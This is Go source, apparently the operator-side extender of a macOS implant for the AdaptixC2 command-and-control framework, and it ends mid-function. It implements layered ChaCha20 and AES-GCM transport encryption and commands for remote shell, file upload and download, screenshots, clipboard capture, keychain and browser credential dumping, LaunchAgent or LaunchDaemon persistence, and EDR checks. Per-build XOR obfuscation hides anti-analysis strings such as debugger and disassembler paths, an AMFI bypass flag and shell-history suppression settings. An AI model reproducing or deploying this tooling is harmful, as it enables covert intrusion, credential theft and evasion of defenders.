// ★ 不是 RFC 8439 的 256 位密钥版（"expand 32-byte k"），不能用 x/crypto/chacha20 替代。
func chachaQr(a, b, c, d *uint32) {
	*a += *b
	*d ^= *a
	*d = bits.RotateLeft32(*d, 16)
	*c += *d
	*b ^= *c
	*b = bits.RotateLeft32(*b, 12)
	*a += *b
	*d ^= *a
	*d = bits.RotateLeft32(*d, 8)
	*c += *d
	*b ^= *c
	*b = bits.RotateLeft32(*b, 7)
}

func chacha20Block(key [4]uint32, nonce [3]uint32, counter uint32) [64]byte {
	state := [16]uint32{
		0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, // "expand 16-byte k"
		key[0], key[1], key[2], key[3],
		key[0], key[1], key[2], key[3],
		counter,
		nonce[0], nonce[1], nonce[2],
	}
	working := state
	for r := 0; r < 10; r++ {
		chachaQr(&working[0], &working[4], &working[8], &working[12])
		chachaQr(&working[1], &working[5], &working[9], &working[13])
		chachaQr(&working[2], &working[6], &working[10], &working[14])
		chachaQr(&working[3], &working[7], &working[11], &working[15])
		chachaQr(&working[0], &working[5], &working[10], &working[15])
		chachaQr(&working[1], &working[6], &working[11], &working[12])
		chachaQr(&working[2], &working[7], &working[8], &working[13])
		chachaQr(&working[3], &working[4], &working[9], &working[14])
	}
	var out [64]byte
	for i := 0; i < 16; i++ {
		binary.LittleEndian.PutUint32(out[4*i:], working[i]+state[i])
	}
	return out
}

func chacha20Xor(key16, nonce12, data []byte) []byte {
	if len(key16) != 16 || len(nonce12) != 12 {
		return nil
	}
	var key [4]uint32
	for i := 0; i < 4; i++ {
		key[i] = binary.LittleEndian.Uint32(key16[4*i:])
	}
	var nonce [3]uint32
	for i := 0; i < 3; i++ {
		nonce[i] = binary.LittleEndian.Uint32(nonce12[4*i:])
	}
	out := make([]byte, len(data))
	var counter uint32
	for off := 0; off < len(data); off += 64 {
		block := chacha20Block(key, nonce, counter)
		n := len(data) - off
		if n > 64 {
			n = 64
		}
		for i := 0; i < n; i++ {
			out[off+i] = data[off+i] ^ block[i]
		}
		counter++
	}
	return out
}

func transportOverlay(buf []byte, sk, salt []byte, nonce []byte, decrypt bool) []byte {
	sub := deriveTransportSubkey(sk, salt)
	if decrypt {
		x := chacha20Xor(sub, nonce, buf)
		return chacha20Xor(sk, nonce, x)
	}
	x := chacha20Xor(sk, nonce, buf)
	return chacha20Xor(sub, nonce, x)
}

// splitExtSessionMaterial: 32 字节及以上取 key[:16] 作 AES 密钥、key[16:32] 作 salt；
// **16 字节时 salt 补零** —— 生成 payload 时内嵌 profile 用的就是监听器密钥（16 字节）。
func splitExtSessionMaterial(key []byte) (aesKey, salt []byte, err error) {
	if len(key) >= 32 {
		return append([]byte(nil), key[:16]...), append([]byte(nil), key[16:32]...), nil
	}
	if len(key) == 16 {
		return key, make([]byte, 16), nil
	}
	return nil, nil, fmt.Errorf("session material: need at least 16 bytes, got %d", len(key))
}

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	aesKey, salt, err := splitExtSessionMaterial(key)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	inner := gcm.Seal(nonce, nonce, data, nil)

	cnonce := make([]byte, 12)
	if _, err = io.ReadFull(rand.Reader, cnonce); err != nil {
		return nil, err
	}
	out := transportOverlay(inner, aesKey, salt, cnonce, false)

	res := make([]byte, 12+len(out))
	copy(res, cnonce)
	copy(res[12:], out)
	return res, nil
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	aesKey, salt, err := splitExtSessionMaterial(key)
	if err != nil {
		return nil, err
	}
	if len(data) < 12 {
		return nil, errors.New("ciphertext too short")
	}
	cnonce := data[:12]
	body := data[12:]

	inner := transportOverlay(body, aesKey, salt, cnonce, true)

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(inner) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}
	nonce, ciphertext := inner[:nonceSize], inner[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	var objects [][]byte
	var command Command

	for _, taskData := range tasks {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}

		_ = msgpack.Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)

		cmd, _ := msgpack.Marshal(command)

		objects = append(objects, cmd)
	}

	message := Message{
		Type:   1,
		Object: objects,
	}

	packData, _ = msgpack.Marshal(message)

	return packData, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error = nil
	)

	err = errors.New("Function Pivot not packed")

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	var cmd Command

	switch command {

	case "cat":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCat{Path: path})
		cmd = Command{Code: COMMAND_CAT, Data: packerData}

	case "cd":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCd{Path: path})
		cmd = Command{Code: COMMAND_CD, Data: packerData}

	case "cp":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_CP, Data: packerData}

	case "download":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}

	case "exit":
		cmd = Command{Code: COMMAND_EXIT, Data: nil}

	case "job":
		if subcommand == "list" {
			cmd = Command{Code: COMMAND_JOB_LIST, Data: nil}

		} else if subcommand == "kill" {
			jobId, err := getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsJobKill{Id: jobId})
			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}

		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "kill":
		pid, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
		cmd = Command{Code: COMMAND_KILL, Data: packerData}

	case "ls":
		dir, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsLs{Path: dir})
		cmd = Command{Code: COMMAND_LS, Data: packerData}

	case "mv":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_MV, Data: packerData}

	case "mkdir":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}

	case "ps":
		cmd = Command{Code: COMMAND_PS, Data: nil}

	case "pwd":
		cmd = Command{Code: COMMAND_PWD, Data: nil}

	case "rm":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsRm{Path: path})
		cmd = Command{Code: COMMAND_RM, Data: packerData}

	case "run":
		taskData.Type = adaptix.TASK_TYPE_JOB

		prog, err := getStringArg(args, "program")
		if err != nil {
			goto RET
		}
		runArgs, _ := args["args"].(string)

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		cmdArgs, _ := shlex.Split(runArgs)
		packerData, _ := msgpack.Marshal(ParamsRun{Program: prog, Args: cmdArgs, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_RUN, Data: packerData}

	case "shell":
		cmdParam, err := getStringArg(args, "cmd")
		if err != nil {
			goto RET
		}

		// macOS: always use /bin/zsh (default shell on macOS)
		cmdArgs := []string{"-c", cmdParam}
		packerData, _ := msgpack.Marshal(ParamsShell{Program: "/bin/zsh", Args: cmdArgs})
		cmd = Command{Code: COMMAND_SHELL, Data: packerData}

	case "screenshot":
		cmd = Command{Code: COMMAND_SCREENSHOT, Data: nil}

	case "clipboard":
		cmd = Command{Code: COMMAND_CLIPBOARD, Data: nil}

	case "persist":
		if subcommand == "launchagent" || subcommand == "launchdaemon" {
			name, err := getStringArg(args, "name")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsPersist{Action: "install", Method: subcommand, Name: name})
			cmd = Command{Code: COMMAND_PERSIST, Data: packerData}
		} else if subcommand == "remove" {
			method, err := getStringArg(args, "method")
			if err != nil {
				goto RET
			}
			name, err := getStringArg(args, "name")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsPersist{Action: "remove", Method: method, Name: name})
			cmd = Command{Code: COMMAND_PERSIST, Data: packerData}
		} else if subcommand == "status" {
			packerData, _ := msgpack.Marshal(ParamsPersist{Action: "status"})
			cmd = Command{Code: COMMAND_PERSIST, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'launchagent', 'launchdaemon', 'remove', or 'status'")
			goto RET
		}

	case "tcc_check":
		cmd = Command{Code: COMMAND_TCC_CHECK, Data: nil}

	case "defaults_read":
		domain, _ := getStringArg(args, "domain")
		packerData, _ := msgpack.Marshal(ParamsDefaults{Domain: domain})
		cmd = Command{Code: COMMAND_DEFAULTS, Data: packerData}

	case "edr_check":
		cmd = Command{Code: COMMAND_EDR_CHECK, Data: nil}

	case "keychain":
		if subcommand == "list" {
			packerData, _ := msgpack.Marshal(ParamsKeychain{Action: "list"})
			cmd = Command{Code: COMMAND_KEYCHAIN, Data: packerData}
		} else if subcommand == "dump" {
			packerData, _ := msgpack.Marshal(ParamsKeychain{Action: "dump"})
			cmd = Command{Code: COMMAND_KEYCHAIN, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'list' or 'dump'")
			goto RET
		}

	case "browser_dump":
		browser, err := getStringArg(args, "browser")
		if err != nil {
			goto RET
		}
		target, _ := getStringArg(args, "target")
		if target == "" {
			target = "list"
		}
		packerData, _ := msgpack.Marshal(ParamsBrowserDump{Browser: browser, Target: target})
		cmd = Command{Code: COMMAND_BROWSER_DUMP, Data: packerData}

	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		if subcommand == "start" {
			address, err := getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			auth := getBoolArg(args, "-a")
			if auth {
				username, err := getStringArg(args, "username")
				if err != nil {
					goto RET
				}
				password, err := getStringArg(args, "password")
				if err != nil {
					goto RET
				}

				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

			} else {
				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "upload":
		remote_path, err := getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err := getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}

		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
		if decodeErr != nil {
			err = decodeErr
			goto RET
		}

		zipContent, zipErr := ZipBytes(fileContent, remote_path)
		if zipErr != nil {
			err = zipErr
			goto RET
		}

		chunkSize := 0x500000 // 5Mb
		bufferSize := len(zipContent)

		inTaskData := adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentData.Id,
			Sync:    false,
		}

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			inPackerData, _ := msgpack.Marshal(ParamsUpload{
				Path:    remote_path,
				Content: zipContent[start:fin],
				Finish:  finish,
			})
			inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

			if finish {
				cmd = inCmd
				break

			} else {
				inTaskData.Data, _ = msgpack.Marshal(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				Ts.TsTaskCreate(agentData.Id, "", "", inTaskData)
			}
		}

	case "zip":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		zip_path, err := getStringArg(args, "zip_path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsZip{Src: path, Dst: zip_path})
		cmd = Command{Code: COMMAND_ZIP, Data: packerData}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, _ = msgpack.Marshal(cmd)

RET:
	return taskData, messageData, err
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	var (
		inMessage Message
		cmd       Command
		job       Job
	)

	err := msgpack.Unmarshal(decryptedData, &inMessage)
	if err != nil {
		return errors.New("failed to unmarshal message")
	}

	if inMessage.Type == 1 {

		for _, cmdBytes := range inMessage.Object {
			err = msgpack.Unmarshal(cmdBytes, &cmd)
			if err != nil {
				continue
			}

			TaskId := cmd.Id
			commandId := cmd.Code
			task := taskData
			task.TaskId = fmt.Sprintf("%08x", TaskId)

			switch commandId {

			case COMMAND_CAT:
				var params AnsCat
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("'%v' file content:", params.Path)
				task.ClearText = string(params.Content)

			case COMMAND_CD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_CP:
				task.Message = "Object copied successfully"

			case COMMAND_PWD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_KILL:
				task.Message = "Process killed"

			case COMMAND_EXIT:
				task.Message = "The agent has completed its work (kill process)"
				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_JOB_LIST:
				var params AnsJobList
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var jobList []JobInfo
				err = msgpack.Unmarshal(params.List, &jobList)
				if err != nil {
					continue
				}

				Output := ""
				if len(jobList) > 0 {
					Output += fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
					Output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")

					for _, value := range jobList {
						stringType := "Unknown"
						if value.JobType == 0x2 {
							stringType = "Download"
						} else if value.JobType == 0x3 {
							stringType = "Process"
						}

						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
					}

					task.Message = "Job list:"
					task.ClearText = Output
				} else {
					task.Message = "No active jobs"
				}

			case COMMAND_JOB_KILL:
				task.Message = "Job killed"

			case COMMAND_LS:
				var params AnsLs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				// macOS agent: always Unix-style listing
				var items []adaptix.ListingFileDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = adaptix.MESSAGE_ERROR
				} else {
					var Files []FileInfo
					err := msgpack.Unmarshal(params.Files, &Files)
					if err != nil {
						continue
					}

					filesCount := len(Files)
					if filesCount == 0 {
						task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
					} else {

						modeFsize := 1
						lnkFsize := 1
						userFsize := 1
						groupFsize := 1
						sizeFsize := 1
						dateFsize := 1

						for _, f := range Files {
							val := fmt.Sprintf("%d", f.Nlink)
							if len(val) > lnkFsize {
								lnkFsize = len(val)
							}
							val = fmt.Sprintf("%d", f.Size)
							if len(val) > sizeFsize {
								sizeFsize = len(val)
							}
							if len(f.Mode) > modeFsize {
								modeFsize = len(f.Mode)
							}
							if len(f.User) > userFsize {
								userFsize = len(f.User)
							}
							if len(f.Group) > groupFsize {
								groupFsize = len(f.Group)
							}
							if len(f.Date) > dateFsize {
								dateFsize = len(f.Date)
							}
						}

						format2 := fmt.Sprintf(" %%-%ds %%-%dd %%-%ds %%-%ds %%-%dd %%-%ds %%s", modeFsize, lnkFsize, userFsize, groupFsize, sizeFsize, dateFsize)
						OutputText := ""
						for _, fi := range Files {
							OutputText += fmt.Sprintf("\n"+format2, fi.Mode, fi.Nlink, fi.User, fi.Group, fi.Size, fi.Date, fi.Filename)

							fileData := adaptix.ListingFileDataUnix{
								IsDir:    fi.IsDir,
								Mode:     fi.Mode,
								User:     fi.User,
								Group:    fi.Group,
								Size:     fi.Size,
								Date:     fi.Date,
								Filename: fi.Filename,
							}

							items = append(items, fileData)
						}

						task.Message = fmt.Sprintf("Listing '%s'", params.Path)
						task.ClearText = OutputText
					}
				}
				Ts.TsClientGuiFilesUnix(task, params.Path, items)

			case COMMAND_MKDIR:
				task.Message = "Directory created successfully"

			case COMMAND_MV:
				task.Message = "Object moved successfully"

			case COMMAND_PS:
				var params AnsPs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				// macOS agent: always Unix-style process listing
				var proclist []adaptix.ListingProcessDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = adaptix.MESSAGE_ERROR
				} else {
					var Processes []PsInfo
					err := msgpack.Unmarshal(params.Processes, &Processes)
					if err != nil {
						continue
					}

					procCount := len(Processes)
					if procCount == 0 {
						task.Message = "Failed to get process list"
						task.MessageType = adaptix.MESSAGE_ERROR
						break
					} else {
						pidFsize := 3
						ppidFsize := 4
						ttyFsize := 3
						contextFsize := 7
						processFsize := 7

						for _, p := range Processes {
							val := fmt.Sprintf("%d", p.Pid)
							if len(val) > pidFsize {
								pidFsize = len(val)
							}
							val = fmt.Sprintf("%d", p.Ppid)
							if len(val) > ppidFsize {
								ppidFsize = len(val)
							}
							if len(p.Tty) > ttyFsize {
								ttyFsize = len(p.Tty)
							}
							if len(p.Context) > contextFsize {
								contextFsize = len(p.Context)
							}
							if len(p.Process) > processFsize {
								processFsize = len(p.Process)
							}

							procData := adaptix.ListingProcessDataUnix{
								Pid:         uint(p.Pid),
								Ppid:        uint(p.Ppid),
								TTY:         p.Tty,
								Context:     p.Context,
								ProcessName: p.Process,
							}

							proclist = append(proclist, procData)
						}

						format := fmt.Sprintf(" %%-%dv  %%-%dv  %%-%ds  %%-%ds  %%-%ds", pidFsize, ppidFsize, ttyFsize, contextFsize, processFsize)
						OutputText := fmt.Sprintf(format, "PID", "PPID", "TTY", "Context", "Process")
						OutputText += fmt.Sprintf("\n"+format, "---", "----", "---", "-------", "-------")

						for _, p := range Processes {
							OutputText += fmt.Sprintf("\n"+format, p.Pid, p.Ppid, p.Tty, p.Context, p.Process)
						}

						task.Message = "Process list:"
						task.ClearText = OutputText
					}
				}
				Ts.TsClientGuiProcessUnix(task, proclist)

			case COMMAND_RM:
				task.Message = "Object removed successfully"

			case COMMAND_SCREENSHOT:
				// Check for error response first
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Screenshot error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				var params AnsScreenshots
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				for _, screen := range params.Screens {
					_ = Ts.TsScreenshotAdd(agentData.Id, "screenshot", screen)
				}
				task.Message = fmt.Sprintf("Screenshots taken: %d", len(params.Screens))

			case COMMAND_SHELL:
				// Check for error response first
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Shell error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Shell command output:"
				task.ClearText = params.Output

			case COMMAND_CLIPBOARD:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Clipboard contents:"
				task.ClearText = params.Output

			case COMMAND_PERSIST:
				var params AnsPersist
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Persistence:"
				task.ClearText = params.Output

			case COMMAND_TCC_CHECK:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "TCC Permissions:"
				task.ClearText = params.Output

			case COMMAND_DEFAULTS:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Defaults output:"
				task.ClearText = params.Output

			case COMMAND_EDR_CHECK:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "EDR/Security scan:"
				task.ClearText = params.Output

			case COMMAND_KEYCHAIN:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Keychain:"
				task.ClearText = params.Output

			case COMMAND_BROWSER_DUMP:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Browser data:"
				task.ClearText = params.Output

			case COMMAND_UPLOAD:
				var params AnsUpload
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("File uploaded: %s", params.Path)

			case COMMAND_ZIP:
				var params AnsZip
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Archive created: %s", params.Path)

			case COMMAND_ERROR:
				var params AnsError
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Error:"
				task.ClearText = params.Error
				task.MessageType = adaptix.MESSAGE_ERROR

			case COMMAND_DOWNLOAD:
				task.Message = "Download started"
				task.Completed = false

			case COMMAND_RUN:
				task.Message = "Process started (async)"
				task.Completed = false

			case COMMAND_TUNNEL_START:
				task.Message = "Tunnel starting"
				task.Completed = false

			case COMMAND_TUNNEL_STOP:
				task.Message = "Tunnel stopped"

			case COMMAND_TUNNEL_PAUSE:
				task.Message = "Tunnel paused"

			case COMMAND_TUNNEL_RESUME:
				task.Message = "Tunnel resumed"

			case COMMAND_TERMINAL_START:
				task.Message = "Terminal starting"
				task.Completed = false

			case COMMAND_TERMINAL_STOP:
				task.Message = "Terminal stopped"

			default:
				task.Message = "Unknown response"
				task.MessageType = adaptix.MESSAGE_ERROR
			}

			outTasks = append(outTasks, task)
		}

	} else if inMessage.Type == 2 {

		for _, jobBytes := range inMessage.Object {

			err = msgpack.Unmarshal(jobBytes, &job)
			if err != nil {
				continue
			}

			commandId := job.CommandId

			switch commandId {

			case COMMAND_DOWNLOAD:
				var params AnsDownload
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					continue
				}

				fileId := fmt.Sprintf("%08x", params.FileId)

				if params.Start {
					_ = Ts.TsDownloadAdd(agentData.Id, fileId, params.Path, int64(params.Size))
				}

				_ = Ts.TsDownloadUpdate(fileId, 1, params.Content)

				if params.Finish {
					if params.Canceled {
						_ = Ts.TsDownloadClose(fileId, 4)
					} else {
						_ = Ts.TsDownloadClose(fileId, 3)
					}
				}

			case COMMAND_RUN:
				var params AnsRun
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					continue
				}

				task := taskData
				task.TaskId = job.JobId
				task.Completed = params.Finish

				if params.Start {
					task.Completed = false
					task.Message = fmt.Sprintf("Process started: PID = %d", params.Pid)
					task.ClearText = "\n"

				} else if params.Finish {
					task.Message = "Process finished"
					task.ClearText = "\n"

				} else {
					task.Completed = false
					task.Message = ""

					if len(params.Stderr) > 0 {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = "Stderr:"
						task.ClearText = params.Stderr
					}
					if len(params.Stdout) > 0 {
						task.ClearText = params.Stdout
					}
				}

				outTasks = append(outTasks, task)

			case COMMAND_TUNNEL_START, COMMAND_TUNNEL_STOP, COMMAND_TUNNEL_PAUSE, COMMAND_TUNNEL_RESUME:
				proxyTask := adaptix.TaskData{
					Type:    adaptix.TASK_TYPE_PROXY_DATA,
					AgentId: agentData.Id,
					Data:    job.Data,
					Sync:    false,
				}
				outTasks = append(outTasks, proxyTask)

			case COMMAND_TERMINAL_START, COMMAND_TERMINAL_STOP:
				termTask := adaptix.TaskData{
					Type:    adaptix.TASK_TYPE_PROXY_DATA,
					AgentId: agentData.Id,
					Data:    job.Data,
					Sync:    false,
				}
				outTasks = append(outTasks, termTask)
			}
		}
	}

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	_ = job

	return nil
}

// xorEncode XOR-encodes a plaintext string with the given key and returns
// a Go byte literal string (e.g., "\x4a\x1b\x...").
func xorEncode(plain string, key []byte) string {
	var sb strings.Builder
	kl := len(key)
	for i := 0; i < len(plain); i++ {
		sb.WriteString(fmt.Sprintf("\\x%02x", plain[i]^key[i%kl]))
	}
	return sb.String()
}

// generateObfuscatedStrings produces a Go source file that replaces hardcoded
// sensitive strings with XOR-decoded equivalents. Each payload build gets a
// unique random key, so the encoded bytes differ across payloads.
func generateObfuscatedStrings(key []byte, buildNonce []byte) string {
	// Strings to obfuscate — exported function name → plaintext
	strs := map[string]string{
		// opsec_darwin.go
		"StrHwModel":      "hw.model",
		"StrKernBootargs":  "kern.bootargs",
		"StrAmfiBypass":    "amfi_get_out_of_my_way",
		"StrSandboxEnv":    "APP_SANDBOX_CONTAINER_ID",
		"StrHopper":        "/Applications/Hopper Disassembler v4.app",
		"StrIDA":           "/Applications/IDA Pro.app",
		"StrGhidra":        "/Applications/Ghidra.app",
		"StrCharles":       "/Applications/Charles.app",
		"StrProxyman":      "/Applications/Proxyman.app",
		"StrWireshark":     "/Applications/Wireshark.app",
		// functions_darwin.go
		"StrSystemVersionPlist": "/System/Library/CoreServices/SystemVersion.plist",
		"StrProductVersion":     "ProductVersion",
		"StrMacOS":              "MacOS",
		// PTY env vars
		"StrHistfile":     "HISTFILE=/dev/null",
		"StrHistfilesize": "HISTFILESIZE=0",
		"StrHistsize":     "HISTSIZE=0",
		"StrHistory":      "HISTORY=",
		"StrHistsave":     "HISTSAVE=",
		"StrHistzone":     "HISTZONE=",
		"StrHistlog":      "HISTLOG=",
	}

	// Key literal
	var keyLit strings.Builder
	keyLit.WriteString("[]byte{")
	for i, b := range key {
		if i > 0 {
			keyLit.WriteString(", ")
		}
		keyLit.WriteString(fmt.Sprintf("0x%02x", b))
	}
	keyLit.WriteString("}")

	// Generate source
	var src strings.Builder
	src.WriteString("package utils\n\n")
	src.WriteString("// AUTO-GENERATED — per-payload XOR-obfuscated strings.\n")
	src.WriteString("// Do not edit. Regenerated on each build.\n\n")
	src.WriteString(fmt.Sprintf("var xorKey = %s\n\n", keyLit.String()))

	// Build nonce — ensures unique binary hash per payload even with identical config
	var nonceLit strings.Builder
	nonceLit.WriteString("[]byte{")
	for i, b := range buildNonce {
		if i > 0 {
			nonceLit.WriteString(", ")
		}
